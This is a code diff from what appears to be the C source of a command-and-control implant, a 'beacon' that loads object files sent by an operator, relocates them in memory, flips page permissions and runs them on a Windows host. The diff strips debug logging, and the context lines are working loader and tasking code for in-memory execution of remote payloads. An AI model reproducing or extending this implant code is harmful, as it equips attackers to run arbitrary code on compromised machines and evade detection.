@@ -11,7 +11,6 @@
 #include <limits.h>
 #include <stddef.h>
 #include "commands.h"
-#include "spawn_trace.h"
 #include "beacon.h"
 #include "parse.h"
 #include "inject.h"
@@ -112,7 +111,6 @@ static int    g_obj_userargs_len = 0;
 extern int http_post_len;
 
 static void postmsg(int type, char * msg, int len) {
-	spawn_log("objout posted len=", (long)len);
 	if (g_obj_callback != 0) {
 		char * blob = (char *)malloc(len + 4);
 		int    id   = g_obj_callback;
@@ -748,7 +746,6 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	off_bss   = (off_pdata + (SIZE_T)pdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
 	total     = off_bss + (SIZE_T)bssSize;
 	if (total == 0) {
-		spawn_log("bofload fail total0", 0x7fffffff);
 		free(ftable);
 		return FALSE;
 	}
@@ -756,14 +753,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	/* the entry offset is wire-supplied and is executed as code_dst + entry -
 	 * it must land inside the code section we actually extracted */
 	if (entry >= (DWORD)code.length) {
-		spawn_log("bofload fail entry", (long)entry);
 		post_error_d(0x4d, (int)entry);
 		free(ftable);
 		return FALSE;
 	}
 
 	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
-		spawn_log("bofload reuse size=", (long)bof_cached_size);
 		DWORD oldrw = 0;
 		base = bof_cached;
 		how = bof_cached_how;
@@ -780,7 +775,6 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 		base = bof_alloc(total, &how);
 		if (base == NULL) {
-			spawn_log("bofload fail alloc total=", (long)total);
 			free(ftable);
 			return FALSE;
 		}
@@ -806,7 +800,6 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
 
 	data_init(&relocsparser, relocs.buffer, relocs.length);
-	spawn_log("bofload rlen=", (long)relocsparser.length);
 	while (TRUE) {
 		char * src;
 		char * dst;
@@ -815,11 +808,9 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		int seclen;
 		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
 		if (reloc == NULL) {
-			spawn_log("bofload relocs exhausted plen=", (long)relocsparser.length);
 			break;
 		}
 		if (reloc->symbol == SYMBOL_END) {
-			spawn_log("bofload end reached plen=", (long)relocsparser.length);
 			success = TRUE;
 			break;
 		}
@@ -893,7 +884,6 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	}
 
 	if (success) {
-		spawn_log("bofload reloc ok base=", 0x7ffffffe);
 		/* claim the pin BEFORE anything else: from here the block must
 		 * survive the load tail (no idle-RW flip, no free, no recycle) */
 		if (bof_load_pin) {
@@ -940,7 +930,6 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		if (perms_ok && (SIZE_T)(base + total - data_dst) > 0)
 			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
 		if (!perms_ok) {
-			spawn_log("bofload perms fail gle=", (long)GetLastError());
 			post_error_d(0x11, (int)GetLastError());
 		}
 		if (perms_ok)
@@ -1042,10 +1031,8 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						}
 					}
 						else {
-							spawn_log("bofload gate exec conv=", (long)conv);
 							command_shell_callback("bofwin skipped (api/nook/threads)", 32, CALLBACK_OUTPUT);
 							inlinefunc(args, alen);
-							spawn_log("bofload gate done", 0x7ffffffe);
 						}
 #else
 				inlinefunc(args, alen);
@@ -1504,7 +1491,6 @@ cleanup:
 }
 
 void command_inline_execute_object(char * buffer, int length) {
-	spawn_log("cmd100: entry len=", (long)length);
 	datap parser;
 	datap_buffer code, relocs;
 	DWORD entry;
@@ -1557,13 +1543,6 @@ void command_inline_execute_object(char * buffer, int length) {
 		 * at all (2026-11-03) - the old non-empty requirement made every
 		 * task_ipconfig fall into the legacy BOF path and the result never
 		 * reached the operator callback. */
-		spawn_log("cmd100 official ok491=", (long)ok491);
-		spawn_log("cmd100 uargs_len=", (long)g_obj_userargs_len);
-		spawn_log("cmd100 c_len=", (long)c491.length);
-		spawn_log("cmd100 args_len=", (long)ar491.length);
-		spawn_log("cmd100 entry=", (long)entry491);
-		spawn_log("cmd100 rd_len=", (long)rd491.length);
-		spawn_log("cmd100 rl_len=", (long)rl491.length);
 
 		if (ok491) {
 			formatp rep;
@@ -1598,13 +1577,10 @@ void command_inline_execute_object(char * buffer, int length) {
 				BOOL okrun;
 				char * runargs = (g_obj_userargs != NULL) ? g_obj_userargs : ar491.buffer;
 				int    runalen = (g_obj_userargs != NULL) ? g_obj_userargs_len : ar491.length;
-				spawn_log("cmd100 preq=", (long)http_post_len);
 				okrun = command_inline_execute_object_parsed(bformat_string(&rep),
 				                                             bformat_length(&rep),
 				                                             entry491, runargs,
 				                                             runalen, 0);
-				spawn_log("cmd100 parsed ret=", (long)okrun);
-				spawn_log("cmd100 postq=", (long)http_post_len);
 			}
 			g_obj_callback = 0;
 			g_obj_userargs = NULL;
